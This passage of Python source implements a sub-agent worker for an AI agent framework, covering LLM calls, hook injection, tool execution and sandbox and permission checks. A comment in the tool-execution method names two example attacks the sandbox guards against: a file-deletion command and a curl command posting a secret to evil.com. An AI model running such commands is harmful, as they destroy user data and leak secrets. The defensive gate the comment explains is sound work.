        config = llm_config if llm_config is not None else getattr(self, "llm_config", None)
        flags = self._protocol_flags(config)
        serializer = SerializerRegistry.get_instance().resolve(flags.serializer_id)
        result = serializer.serialize(messages, SerializeContext(flags=flags))
        if revoke_after:
            # [方案 A] 产出即回收：产物与入参双扫（passthrough 直通二者同引用，
            # 幂等重复扫零害；拷贝型序列化器两份都可能持有 data URI）
            try:
                from app.utils.image_utils import revoke_vision_blocks

                restored = revoke_vision_blocks(
                    result.messages, getattr(self, "_vision_session_ids", None) or ""
                )
                if result.messages is not messages:
                    restored += revoke_vision_blocks(
                        messages, getattr(self, "_vision_session_ids", None) or ""
                    )
                if restored:
                    logger.debug(
                        f"[Memory] 子代理 serialize 出口回收 {restored} 张图片（data URI → image_ref）"
                    )
            except Exception as e:  # noqa: BLE001 — 回收失败保留 data URI，不阻断
                logger.warning(f"[SubAgentWorker] serialize vision revoke 失败（保留 data URI）: {e}")
        return result

    def _protocol_flags(self, llm_config: Dict = None):
        """经 ModelAdapterRegistry 解析完整协议开关（含 serializer_id，冷启动防御同 Task 1）"""
        from app.plugins.registries.model_adapter_registry import ModelAdapterRegistry

        registry = ModelAdapterRegistry.get_instance()
        config = llm_config if llm_config is not None else getattr(self, "llm_config", None)
        adapter = registry.resolve(config or {})
        if adapter is None:
            adapter = self._resolve_adapter_with_warmup(registry, config or {})
        if adapter is None:
            raise RuntimeError(
                "未注册任何 ModelAdapter 插件（含系统插件 openai），请确认 plugins/system-model-adapters/ 已启用"
            )
        return adapter.protocol_flags(config or {})

    def _requires_reasoning_content(self, llm_config: Dict) -> bool:
        """thinking 模式下，兼容要求 tool-call assistant 保留 reasoning_content 字段的 provider。

        通过 ModelAdapterRegistry 解析（系统插件 openai 兜底，可被插件覆盖）。
        每调用解析一次 ——该方法每轮对话仅调用数次，开销可忽略；
        不缓存避免 worker 生命周期与热重载不一致。
        """
        from app.plugins.registries.model_adapter_registry import ModelAdapterRegistry

        registry = ModelAdapterRegistry.get_instance()
        adapter = registry.resolve(llm_config or {})
        if adapter is None:
            adapter = self._resolve_adapter_with_warmup(registry, llm_config)
        if adapter is None:
            raise RuntimeError(
                "未注册任何 ModelAdapter 插件（含系统插件 openai），请确认 plugins/system-model-adapters/ 已启用"
            )
        return adapter.protocol_flags(llm_config or {}).requires_reasoning_content

    def _resolve_adapter_with_warmup(self, registry, llm_config: Dict) -> Optional[Any]:
        """冷启动兜底：注册表为空时幂等加载系统插件再 resolve（同 chat_worker._adapter_flags 防御）"""
        try:
            if registry.adapters():
                return None
            # [PERF 2026-10-24] 只补扫 model_adapters（同 chat_worker 冷启动防御收窄）
            from app.plugins.loaders import runtime_component_loader as _rcl

            _rcl._persistent_loader("model_adapters").scan_roots()
        except Exception as e:
            logger.warning(f"[SubAgentWorker] 冷启动 ModelAdapter 加载失败: {e}")
            return None
        return registry.resolve(llm_config or {})

    # ========== Hook 集成（让子智能体也能应用所有 hook） ==========
    # 设计目标：与 chat_worker 对齐，让子智能体也能触发/消费以下 hook：
    #   - PreAssistantMessage / PostAssistantMessage：子智能体自己同步触发
    #   - PreToolUse / PostToolUse：tool_executor.execute() 已触发，消息进 backend 队列，
    #     此处只需消费对应队列
    # 所有 hook context 都会注入 current_role="subagent" + agent_name，
    # 让 hook 脚本能识别当前执行角色并按需分支。

    def _build_hook_context(self, extra: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """构造 hook context：基础字段（current_role/agent_name/task_id/workdir）+ 调用方扩展"""
        ctx: Dict[str, Any] = {
            "agent_name": self.agent_name,
            "current_role": "subagent",  # 关键：让 hook 知道当前是子智能体
            "is_subagent_call": self.is_subagent_call,
            "task_id": self.task_id,
            "task_description": self.task_description,
        }
        # project_root：用于 read_project_notes 等需要 workdir 的 hook
        try:
            if self.tool_executor and hasattr(self.tool_executor, "get_workdir"):
                ctx["project_root"] = self.tool_executor.get_workdir() or ""
        except Exception:
            pass
        if extra:
            ctx.update(extra)
        return ctx

    def _trigger_hook_sync(
        self,
        event_name: str,
        current_messages: List[Dict],
        extra_context: Optional[Dict[str, Any]] = None,
    ) -> None:
        """同步触发 hook 并把每条 hook 输出追加到 current_messages（in-place）

        与 chat_worker._trigger_worker_hook 行为一致：
        - 使用 trigger_event(sync) 同步执行 hook
        - 用 _make_hook_message 包装成 user 消息（role=user，与 Claude Code 官方行为对齐）
        - 直接 append 到 current_messages，下次 API 调用时 LLM 即可看到

        HookPolicy 接入（scope=subagent）：按 _hook_policy_id 解析策略，
        默认 SubagentDefaultHookPolicy（仅工具级 + Stop + PluginChanged）。
        PreAssistantMessage/PostAssistantMessage 走 subagent 自注入（不在 hook_policy 范围）。
        """
        try:
            backend = getattr(self.tool_executor, "_backend", None) if self.tool_executor else None
            if not backend or not backend.hook_manager:
                return

            ctx = self._build_hook_context(extra=extra_context)

            # HookPolicy 拦截：构造具体事件类 + should_trigger 判定
            from app.plugins.contracts.hook_policy import (
                PostAssistantMessageEvent,
                PreAssistantMessageEvent,
                PluginChangedEvent,
                PostToolUseEvent,
                PreToolUseEvent,
                StopEvent,
            )

            is_team = bool(ctx.get("is_team_member", False))
            role = ctx.get("current_role", "subagent")
            if event_name == "PreAssistantMessage":
                ev = PreAssistantMessageEvent(message=ctx.get("message", ""), is_team_member=is_team)
            elif event_name == "PostAssistantMessage":
                ev = PostAssistantMessageEvent(message=ctx.get("message", ""), is_team_member=is_team)
            elif event_name == "PreToolUse":
                ev = PreToolUseEvent(
                    tool_name=ctx.get("tool_name", ""),
                    tool_args=ctx.get("tool_args", {}) if isinstance(ctx.get("tool_args"), dict) else {},
                    tool_call_id=ctx.get("tool_call_id", ""),
                    current_role=role,
                    is_subagent_call=True,
                    is_team_member=is_team,
                )
            elif event_name == "PostToolUse":
                ev = PostToolUseEvent(
                    tool_name=ctx.get("tool_name", ""),
                    tool_result=ctx.get("tool_result"),
                    tool_call_id=ctx.get("tool_call_id", ""),
                    current_role=role,
                    is_subagent_call=True,
                    is_team_member=is_team,
                    success=ctx.get("success", True),
                )
            elif event_name == "Stop":
                ev = StopEvent(reason=ctx.get("reason", "completed"), is_team_member=is_team)
            elif event_name == "PluginChanged":
                ev = PluginChangedEvent(
                    action=ctx.get("action", ""),
                    plugin_name=ctx.get("plugin_name", ""),
                    diff=ctx.get("diff", {}),
                    sub_actions=ctx.get("sub_actions", []),
                )
            else:
                ev = None
            if ev is not None and not self._should_run_hook(ev):
                return

            # PreAssistantMessage / PostAssistantMessage：注入上下文使用量信息
            # 让 hook（如 system-handoff 的 auto_compact_trigger）能检测当前 token 占比
            if event_name in ("PreAssistantMessage", "PostAssistantMessage"):
                try:
                    from app.core.infra.token_estimator import count_messages_tokens as _count
                    from app.core.modelmeta.model_capabilities import resolve_context_limit as _resolve_limit

                    token_count = _count(current_messages)
                    token_limit = 0
                    llm_config = getattr(self, "llm_config", None)
                    if llm_config:
                        token_limit = _resolve_limit(llm_config)
                    ctx["token_count"] = token_count
                    ctx["token_limit"] = token_limit
                    if token_count > 0 and token_limit > 0:
                        ctx["token_ratio"] = token_count / token_limit
                    else:
                        ctx["token_ratio"] = 0.0
                except Exception:
                    pass

            # 取最新 user 消息作为 current_message（用于 matcher 匹配）
            cur_msg = ""
            for m in reversed(current_messages):
                if m.get("role") == "user":
                    c = m.get("content", "")
                    if isinstance(c, str):
                        cur_msg = c
                    break

            # 🛡️ skip_finished_callback=True：下方 results 循环已把 hook 输出注入
            # messages，完成回调再经 backend.on_hook_finished 入队属重复投递。
            # 旧实现事后按「队列长度差 + FIFO 头取」排出，会把同期入队的外部消息
            # （用户插话 / TeamMail 等，排在 hook 消息之前时首个被 get_nowait() 取走）
            # 误当作 hook 输出丢弃。与 chat_worker 同根因，一并改为从源头不入队。
            results = backend.hook_manager.trigger_event(
                event_name,
                context=ctx,
                current_message=cur_msg,
                trigger_async=False,
                skip_finished_callback=True,
            )

            # 收集成功执行的 hook 输出，注入 messages
            # ★ 只注入标记为 add_to_context=true 的 hook 结果
            from app.core.conversation.backend import _make_hook_message

            injected = 0
            for r in results:
                if r.success and r.output and r.add_to_context:
                    msg = _make_hook_message(event_name, r.output, r.status_message)
                    current_messages.append(msg)
                    injected += 1
            if injected:
                logger.debug(f"[SubAgent] Hook '{event_name}' injected {injected} msg(s) into messages")
        except Exception as e:
            logger.debug(f"[SubAgent] Hook '{event_name}' trigger failed: {e}")

    def _drain_hook_queues(self) -> List[Dict[str, Any]]:
        """消费 backend 的 _pre_tool_message_queue 和 _hook_message_queue

        tool_executor.execute() 内部已同步触发 PreToolUse/PostToolUse，
        对应消息已分别进 _pre_tool_message_queue 和 _hook_message_queue。
        这里把两个队列的消息全取出来，由调用方按需插入到 tool_result 之前/之后。
        """
        msgs: List[Dict[str, Any]] = []
        try:
            backend = getattr(self.tool_executor, "_backend", None) if self.tool_executor else None
            if not backend:
                return msgs
            for q_attr in ("_pre_tool_message_queue", "_hook_message_queue"):
                q = getattr(backend, q_attr, None)
                if q is None:
                    continue
                while True:
                    try:
                        msgs.append(q.get_nowait())
                    except Exception:
                        break
            # PluginChanged 净零合并：连续开关插件（中间无消费）时整批不注入
            try:
                from app.core.hooks.hook_manager import filter_net_zero_plugin_messages

                msgs = filter_net_zero_plugin_messages(msgs)
            except Exception as e:
                logger.debug(f"[SubAgent] 净零合并判定跳过: {e}")
        except Exception as e:
            logger.debug(f"[SubAgent] drain hook queues failed: {e}")
        return msgs

    def _collect_vision_session_ids(self, messages: List[Dict]) -> List[str]:
        """[方案 A] 收集消息中 image_ref 块的真实落盘 session_id（revive 前调用）。"""
        ids = []
        for msg in messages:
            if not isinstance(msg, dict):
                continue
            content = msg.get("content")
            if not isinstance(content, list):
                continue
            for b in content:
                if isinstance(b, dict) and b.get("type") == "image_ref":
                    ref = b.get("image_ref") or {}
                    sid = str(ref.get("session_id") or "")
                    if sid and sid not in ids:
                        ids.append(sid)
        return ids

    def _revoke_vision_after_send(self, messages: List[Dict]) -> None:
        """[方案 A] 子代理发送收尾：data URI 还原为 image_ref（对称 chat_worker）。

        current_messages 跨迭代常驻，revive 每轮就地升级为 data URI，迭代间
        由本方法回收；下一轮 _serialize_for_api 经 revive 幂等读回。
        """
        try:
            from app.utils.image_utils import revoke_vision_blocks

            restored = revoke_vision_blocks(
                messages,
                getattr(self, "_vision_session_ids", None) or "",
            )
            if restored:
                logger.debug(f"[Memory] 子代理发送后回收 {restored} 张图片")
        except Exception as e:  # noqa: BLE001 — 回收失败保留 data URI
            logger.warning(f"[SubAgentWorker] vision revoke 失败（保留 data URI）: {e}")

    @_in_flight
    def _make_api_call(self, messages: List[Dict], tools: List[Dict] = None, llm_config: Dict = None) -> tuple:
        """调用 LLM API（流式发起 + 事件聚合，子智能体后台执行无需逐字渲染）。

        Phase 3（2026-11-07）：协议差异全部交给 transport 插件（chat/completions
        与 responses 共用 StreamEvent 接口），本方法只做认证头、序列化与事件聚合。
        """
        # 使用传入的 llm_config 或回退到 self.llm_config
        config = llm_config if llm_config is not None else self.llm_config
        # 防御：确保 config 是 dict（传递给子智能体的配置可能被意外覆盖为字符串）
        if not isinstance(config, dict):
            logger.warning(
                f"[SubAgentExecutor] _make_api_call received non-dict config: "
                f"{type(config).__name__}={config!r}, falling back to empty config"
            )
            config = {}
        api_key = str(config.get("API_KEY", "") or "").strip()
        base_url = config.get("API_URL") or None

        # Code Assist 原生协议暂不支持子代理链路（非流式分支未实现 generateContent 形态），
        # 显式拦截避免错误格式的 OpenAI 请求打到该端点产生难排查的 400
        if "cloudcode-pa.googleapis.com" in str(base_url or ""):
            raise RuntimeError(
                "子代理暂不支持 Gemini OAuth（Code Assist）协议：请在团队/子代理配置中改用 OpenAI 兼容模型"
            )

        # chat 形态消息：chat transport 直接用它发请求；responses transport 忽略它，
        # 从内部格式 messages 自行序列化 input_items
        api_messages = self._serialize_for_api(messages, config).messages

        from app.core.workers.error_handler import create_api_call_with_retry
        from app.core.workers.protocol_dispatch import resolve_transport_target
        from app.plugins.registries.transport_registry import TransportRegistry
        from app.utils.http_client import build_openai_client

        target = resolve_transport_target(config, self._protocol_flags(config))
        if isinstance(target, str):
            transport = TransportRegistry.get_instance().resolve(target)
        elif target is not None:
            transport = target
        else:
            transport = TransportRegistry.get_instance().resolve()
        if transport is None:
            raise RuntimeError("未注册协议传输器（system-transports 插件未启用），子智能体无法发起请求")

        client = build_openai_client(api_key=api_key, base_url=base_url, timeout=120.0)
        auth_headers = resolve_extra_headers(config, getattr(self, "_task_session_id", None) or "")

        def create_stream():
            return transport.create_stream(
                config,
                messages,
                tools=tools,
                auth_headers=auth_headers or None,
                api_messages=api_messages,
                client=client,
                cap_max_tokens=lambda m, v: self._cap_max_output_tokens(m, v, config),
            )

        events = create_api_call_with_retry(
            client,
            create_stream,
            cancel_check=lambda: self._is_cancelled,
        )
        return self._aggregate_events(events)

    def _aggregate_events(self, events) -> tuple:
        """StreamEvent 流 → (content, tool_calls, reasoning)（协议无关聚合）。

        工具调用差异：chat/completions 只发 begin + args 增量（参数靠累积），
        responses 还会发 done（完整参数）。这里两者都收：id 缺失时按 index 兜底，
        参数在结束时统一补齐，避免下游拿空 arguments 解析失败。
        """
        content_parts: List[str] = []
        reasoning_parts: List[str] = []
        tool_calls: List[Dict] = []
        by_id: Dict[str, Dict] = {}
        index_to_id: Dict[Any, str] = {}

        def _ensure(tc_id: str, name: str = "") -> Dict:
            tc = by_id.get(tc_id)
            if tc is None:
                tc = {
                    "id": tc_id,
                    "type": "function",
                    "function": {"name": name or "", "arguments": ""},
                }
                by_id[tc_id] = tc
                tool_calls.append(tc)
            return tc

        for ev in events:
            if self._is_cancelled:
                logger.info("[SubAgentWorker] 流式聚合被取消")
                raise RuntimeError("cancelled")
            etype = getattr(ev, "type", "")
            if etype == "content_delta":
                if ev.text:
                    content_parts.append(ev.text)
            elif etype == "reasoning_delta":
                if ev.text:
                    reasoning_parts.append(ev.text)
            elif etype == "tool_call_begin":
                tc_id = ev.tool_call_id or ""
                if not tc_id:
                    tc_id = f"subagent_{len(tool_calls)}"
                if ev.index != -1:
                    index_to_id[ev.index] = tc_id
                tc = _ensure(tc_id, ev.name or "")
                if ev.name:
                    tc["function"]["name"] = ev.name
            elif etype == "tool_args_delta":
                tc_id = ev.tool_call_id or index_to_id.get(ev.index, "")
                if tc_id and ev.text:
                    _ensure(tc_id)["function"]["arguments"] += ev.text
            elif etype == "tool_call_done":
                tc_id = ev.tool_call_id or index_to_id.get(ev.index, "")
                if tc_id:
                    tc = _ensure(tc_id, ev.name or "")
                    if ev.name:
                        tc["function"]["name"] = ev.name
                    if ev.arguments:
                        tc["function"]["arguments"] = ev.arguments
            elif etype == "usage":
                if ev.usage:
                    self._record_usage(ev.usage)

        for tc in tool_calls:
            if not tc["function"]["arguments"]:
                tc["function"]["arguments"] = "{}"
        # 无名工具调用无法执行，丢弃（与旧聚合器同口径）
        tool_calls = [tc for tc in tool_calls if tc["function"]["name"]]

        response_content = self._filter_thinking_content("".join(content_parts))
        reasoning_content = "".join(reasoning_parts)
        if not content_parts and not tool_calls and not reasoning_parts:
            logger.warning("[SubAgentWorker] 流式响应未产出内容、思考或工具调用")

        return response_content, tool_calls, reasoning_content

    def _record_usage(self, usage) -> None:
        """usage → token 用量记账与信号发射（transport 统一给 dict）。"""
        try:
            if isinstance(usage, dict):
                pt = usage.get("prompt_tokens", 0) or 0
                ct = usage.get("completion_tokens", 0) or 0
                tt = usage.get("total_tokens", 0) or 0
            else:
                pt = getattr(usage, "prompt_tokens", 0) or 0
                ct = getattr(usage, "completion_tokens", 0) or 0
                tt = getattr(usage, "total_tokens", 0) or 0
            self._total_prompt_tokens += pt
            self._total_completion_tokens += ct
            self._total_tokens += tt
            if tt > self._peak_total_tokens:
                self._peak_total_tokens = tt
            self.token_usage_updated.emit(self.task_id, pt, ct, tt)
        except Exception:
            pass

    def _cap_max_output_tokens(self, model: str, requested: int, llm_config: Dict = None) -> int:
        """
        计算 max_tokens 的合理上限。

        核心原则：
        - 用户明确设置的 max_tokens 应被尊重，provider 默认值不再作为硬上限
        - 仅对已知的模型特定限制做软提示（不强制截断）
        - 对于 write/edit 等工具调用场景，需要足够的输出 token
          来生成完整的 arguments JSON（含长 content）

        Args:
            model: 模型名称
            requested: 用户配置中请求的 max_tokens
            llm_config: LLM 配置字典（优先使用）

        Returns:
            合理的 max_tokens 值
        """
        try:
            requested_int = int(requested)
        except Exception:
            return requested

        config = llm_config if llm_config is not None else self.llm_config

        # 0. 模型真实输出上限优先（与 chat_worker._cap_max_output_tokens 同源同序，
        #    两处漏改 = 主对话与子智能体输出上限分叉）
        caps_max = get_caps_max_output_tokens(model, config)
        if caps_max is not None:
            return caps_max if requested_int <= 0 else min(requested_int, caps_max)

        profile = get_provider_profile(config)

        # 1. 如果用户没有设置或设置值 <= 0，使用 provider 默认值
        if requested_int <= 0:
            return int(profile.get("max_output_tokens", 8192))

        # 2. 获取绝对上限（防止用户设置极端值）
        #    插件声明的 absolute_limit 优先；两级都缺失时才用兜底常量
        absolute_limit = int(profile.get("absolute_limit") or ABSOLUTE_FALLBACK_CEILING)

        # 3. 针对特定模型系列的软限制（仅当用户设置值超出时才生效）
        family = profile.get("family", "")
        model_name = (model or "").lower()

        if family == "openai":
            if "gpt-4-turbo" in model_name:
                # GPT-4-Turbo 实际限制 4096，超出会报错
                if requested_int > 4096:
                    return 4096
        elif family == "anthropic":
            # Claude 系列上限一般为 8192
            pass
        elif family == "minimax":
            pass  # MiniMax 支持高输出

        # 4. 只做绝对上限保护（避免明显错误的极值）
        return min(requested_int, absolute_limit)

    @_in_flight
    def _execute_tools(self, tool_calls: List[Dict]) -> tuple:
        """执行工具调用

        返回 (tool_results, hook_messages) 元组。
        - tool_results: 纯 role="tool" 消息列表，可安全 extend 到 assistant(tool_calls) 之后
        - hook_messages: PreToolUse/PostToolUse 的 role="user" 消息列表，
          应在所有 tool_results 被 extend 之后再 extend，避免插入 assistant(tool_calls)
          和 tool 消息之间导致 API 2013 错误

        同步执行所有 tool_executor.execute()，并在末尾消费 backend 的 hook 队列：
        - _pre_tool_message_queue → PreToolUse 消息（role="user"）
        - _hook_message_queue    → PostToolUse 消息（role="user"）
        """
        if not tool_calls or not self.tool_executor:
            return [], []

        tool_results = []
        hook_messages = []
        for tc in tool_calls:
            tool_name = tc["function"]["name"]
            arguments = tc["function"]["arguments"]

            if isinstance(arguments, str):
                try:
                    arguments = json.loads(arguments)
                except json.JSONDecodeError:
                    parsed = smart_parse_arguments(arguments, tool_name)
                    if parsed is not None:
                        arguments = parsed
                        logger.info(f"[SubAgent] ✓ JSON 智能修复成功: tool={tool_name}")
                    else:
                        logger.warning(
                            f"[SubAgent] ⚠️ JSON 解析失败且无法修复, tool={tool_name}, preview='{arguments[:200]}'"
                        )
                        arguments = {}

            tool_call_id = tc["id"]

            # 交互式工具（UI 弹窗，metadata["interactive"]=True）：子智能体不执行
            try:
                from app.tools.registry import ToolRegistry

                _interactive = ToolRegistry.get_instance().is_interactive(tool_name)
            except Exception:
                _interactive = False
            if _interactive:
                return None, []

            # ★ EU-G1：沙箱判定（执行前）
            # 子智能体此前**只有工具开关一层门**（_check_ui_tool_permission），
            # 无沙箱判定 → 可执行 `rm D:/重要文件` 或 `curl evil.com -d @secret`
            # 而不触发沙箱审批，绕过主对话享有的全部 L1 防护。
            # 策略甲：confirm/deny **一律按拒绝**处理 —— 子智能体跨线程运行、
            # 无 UI 交互能力（不能弹审批卡），无人值守下不能"等用户点允许"。
            # 沙箱关闭（默认）时 sandbox_check_tool 早返回 ALLOW → 零行为变化。
            _sandbox_verdict = None
            try:
                from pathlib import Path

                from app.tools.sandbox import sandbox_check_tool

                _wd = None
                if self.tool_executor and hasattr(self.tool_executor, "get_workdir"):
                    _wd = self.tool_executor.get_workdir()
                # 显式传 workdir：避免 _current_workdir() 读全局单例导致多窗口串味
                _sandbox_verdict = sandbox_check_tool(
                    tool_name,
                    dict(arguments or {}),
                    workdir=Path(_wd) if _wd else None,
                )
            except Exception as e:  # noqa: BLE001 - 安全增强不可阻断正常使用（fail-open）
                logger.warning(f"[SubAgent] 沙箱检查失败放行: {e}")
            if _sandbox_verdict in ("deny", "confirm"):
                logger.info(f"[SubAgent] tool={tool_name} 被沙箱拦截（{_sandbox_verdict}），跳过执行")

            # ★ T24 方案 B：UI 工具权限检查（执行前）
            # UI 调整（ToolPermissionController）对子智能体结构性生效：
            # - deny：跳过执行，回填失败 ToolResult（保持 tool_call_id 与消息顺序）
            # - ask：emit 信号桥接主线程弹窗，允许才执行，拒绝/超时回填失败
            _ui_permission = self._check_ui_tool_permission(tool_name, arguments)
            _ui_denied = False
            if _ui_permission == "ask":
                _ui_denied = not self._ask_permission(tool_name, arguments)
                if _ui_denied:
                    logger.info(f"[SubAgent] 工具 {tool_name} 被用户拒绝（ask）")
            elif _ui_permission == "deny":
                _ui_denied = True
                logger.info(f"[SubAgent] 工具 {tool_name} 已被 UI 禁用（deny），跳过执行")
            if _sandbox_verdict in ("deny", "confirm"):
                _ui_denied = True

            self._tool_call_count += 1
            self.tool_call_started.emit(self.task_id, tool_name, arguments)
            self._add_log("tool_call", tool_name, {"args": arguments})
            # [T4-3] 已删除 `QCoreApplication.processEvents()`：子线程无 Qt 事件
            # 循环，该调用是纯空转。勿回加。

            # 工具执行也算活跃（避免 stall 检测器误杀）
            self._last_activity_time = time.time()

            if _ui_denied:
                # 跳过执行，回填失败 ToolResult（保持 tool_call_id 与消息顺序）
                if _sandbox_verdict in ("deny", "confirm"):
                    # 沙箱拦截：明确告知原因 + 引导模型改走主对话（子智能体无审批 UI）
                    result = ToolResult(
                        False,
                        error=(
                            f"工具 {tool_name} 被安全中心拦截（沙箱判定：{_sandbox_verdict}）。"
                            "子智能体无法弹审批窗，请改为让主对话代为执行此操作，"
                            "或改用不触碰沙箱边界的替代方案。"
                        ),
                    )
                else:
                    result = ToolResult(False, error=f"工具 {tool_name} 已被禁用或拒绝")
            else:
                # tool_executor.execute() 内部已同步触发 PreToolUse 和 PostToolUse，
                # 消息分别进 backend 的 _pre_tool_message_queue / _hook_message_queue
                # 传入 hook_context 覆盖默认角色，防止 subagent 工具调用误用 primary 角色
                result = self.tool_executor.execute(
                    tool_name,
                    arguments,
                    hook_context={
                        "current_role": "subagent",
                        "is_subagent_call": True,
                    },
                )
            result_content = str(result) if result else ""
            success = getattr(result, "success", True) if result else False

            self.tool_result_received.emit(self.task_id, tool_name, result_content, success)
            self._add_log("tool_result", tool_name, {"result": result_content, "success": success})
            # [T4-3] 已删除 `QCoreApplication.processEvents()`：子线程无 Qt 事件
            # 循环，该调用是纯空转。勿回加。

            # 消费 PreToolUse 队列（role="user" 消息），放入 hook_messages 而非 tool_results
            pretool_msgs = self._drain_pretool_queue()
            if pretool_msgs:
                hook_messages.extend(pretool_msgs)

            raw_result = {
                "role": "tool",
                "tool_call_id": tool_call_id,
                "name": tool_name,
                "content": result_content,
                "arguments": arguments,
                "success": success,
                "round_id": f"round_{id(tc)}",
                "diff": getattr(result, "diff", None) if result else None,
                "anchors": getattr(result, "anchors", None) if result else None,
            }
            # 工具请求本轮收尾（插件通用契约 ToolResult.end_turn）：子智能体本轮
            # 不再发起下一轮 API 调用，直接拿已产出的文本收工。
            if getattr(result, "end_turn", False):
                self._end_turn_requested = True
            # 用 to_api_message 标准化：仅保留 role/tool_call_id/name/content，避免非标字段混淆API
            serialized = self._serialize_for_api([raw_result]).messages
            tool_results.append(serialized[0] if serialized else raw_result)

            # 消费 PostToolUse 队列（role="user" 消息），放入 hook_messages 而非 tool_results
            posttool_msgs = self._drain_posttool_queue()
            if posttool_msgs:
                hook_messages.extend(posttool_msgs)

        return tool_results, hook_messages

    def _check_ui_tool_permission(self, tool_name: str, arguments: dict = None) -> str:
        """UI 工具权限检查（T24 执行层唯一控制点）— 返回 "allow" / "deny" / "ask"。

        优先级（对齐产品指示）：
        a) UI controller toggles：用户显式关闭的工具（toggles False）→ UI 为准
           （behavior=deny → deny；ask → 弹窗询问），覆盖模板 allow
        b) UI 开启/默认（toggles True）→ 模板 PermissionResolver 判定：
           模板 deny → 执行层拦截（返回 deny，schema 已静态化不再移除）
           模板 allow/ask → 执行（子智能体无模板 ask 弹窗机制，视为允许）
        c) 团队工具无条件放行

        check_name 归一化（mcp__server__tool → tool）；无 controller（API 模式）
        回退 Settings.tool_toggles。
        """
        from app.tools.registry import ToolRegistry

        if tool_name in ToolRegistry.get_instance().team_only_tools():
            return "allow"
        check_name = tool_name
        if tool_name.startswith("mcp__"):
            parts = tool_name.split("__", 2)
            check_name = parts[2] if len(parts) > 2 else tool_name

        controller = None
        backend = getattr(self.tool_executor, "_backend", None) if self.tool_executor else None
        if backend is not None:
            controller = getattr(backend, "tool_permission_controller", None)

        policies: Dict[str, str] = {}
        if controller is not None:
            toggles = controller.get_toggles()
            behavior = controller.get_behavior()
        else:
            from app.utils.config import Settings

            settings = Settings.get_instance()
            toggles = dict(settings.tool_toggles.value)
            behavior = settings.tool_off_behavior.value
            policies = dict(settings.tool_permission_policy.value)

        is_enabled = toggles.get(check_name, True)
        if not is_enabled:
            # per-tool 关闭策略优先，缺失回退全局 behavior（与 UI 引擎 _check_tool_permission 同口径）
            from app.core.tools.tool_permission_controller import resolve_tool_off_policy

            return resolve_tool_off_policy(check_name, controller, policies, behavior)

        # ★ T28：UI 显式开启（用户调整过该工具）→ UI 为准，放行（覆盖模板 deny）
        if controller is not None and controller.is_user_modified(check_name):
            return "allow"

        # 未调整（默认开启）→ 模板 PermissionResolver（模板 deny 执行层拦截）
        try:
            agent = self.agent_manager.get_agent(self.agent_name) if self.agent_manager else None
            if agent is not None:
                from app.core.conversation.agent import PermissionResolver

                resolver = PermissionResolver(agent.permission, {}, agent.tools)
                # 权限参数适配（与 UI 引擎/AGENT_CONFIG 同口径）：
                # bash 用 command、read 用 filePath...（registry metadata 驱动）
                try:
                    mode, arg = ToolRegistry.get_instance().permission_resolve_args(tool_name, arguments or {})
                except Exception:
                    mode, arg = "plain", ""
                if mode == "task":
                    check_result = resolver.resolve_task(arg)
                elif arg:
                    check_result = resolver.resolve(tool_name, arg)
                else:
                    check_result = resolver.resolve(tool_name)
                if check_result == "deny":
                    return "deny"
        except Exception as e:
            logger.debug(f"[SubAgent] 模板权限解析失败，放行: {e}")
        return "allow"

    def _ask_permission(self, tool_name: str, arguments: dict, timeout: float = 30.0) -> bool:
        """ask 行为：emit 信号桥接主线程弹窗，等待用户决策（超时按拒绝）。

        主线程连接 permission_requested 后弹窗 → respond_permission(allow)
        → 本方法返回结果。用户 30s 无响应按拒绝处理（不阻塞子智能体任务）。
        """
        self._permission_event.clear()
        self._permission_allow = False
        self._permission_answered = False
        try:
            self.permission_requested.emit(self.task_id, tool_name, arguments)
        except Exception as e:
            logger.warning(f"[SubAgent] permission_requested emit failed: {e}")
            return False
        self._permission_event.wait(timeout)
        return self._permission_allow

    def respond_permission(self, allow: bool):
        """主线程响应权限询问结果（ask 分支继续执行/拒绝）。"""
        self._permission_allow = bool(allow)
        self._permission_answered = True
        self._permission_event.set()

    def _drain_pretool_queue(self) -> List[Dict[str, Any]]:
        """仅消费 backend 的 _pre_tool_message_queue（PreToolUse 消息）"""
        msgs: List[Dict[str, Any]] = []
        try:
            backend = getattr(self.tool_executor, "_backend", None) if self.tool_executor else None
            if not backend:
                return msgs
            q = getattr(backend, "_pre_tool_message_queue", None)
            if q is None:
                return msgs
            while True:
                try:
                    msgs.append(q.get_nowait())
                except Exception:
                    break
        except Exception as e:
            logger.debug(f"[SubAgent] drain pretool queue failed: {e}")
        return msgs

    def _drain_posttool_queue(self) -> List[Dict[str, Any]]:
        """仅消费 backend 的 _hook_message_queue（PostToolUse 消息）"""
        msgs: List[Dict[str, Any]] = []
        try:
            backend = getattr(self.tool_executor, "_backend", None) if self.tool_executor else None
            if not backend:
                return msgs
            q = getattr(backend, "_hook_message_queue", None)
            if q is None:
                return msgs
            while True:
                try:
                    msgs.append(q.get_nowait())
                except Exception:
                    break
            # PluginChanged 净零合并：连续开关插件（中间无消费）时整批不注入
            try:
                from app.core.hooks.hook_manager import filter_net_zero_plugin_messages

                msgs = filter_net_zero_plugin_messages(msgs)
            except Exception as e:
                logger.debug(f"[SubAgent] 净零合并判定跳过: {e}")
        except Exception as e:
            logger.debug(f"[SubAgent] drain posttool queue failed: {e}")
        return msgs
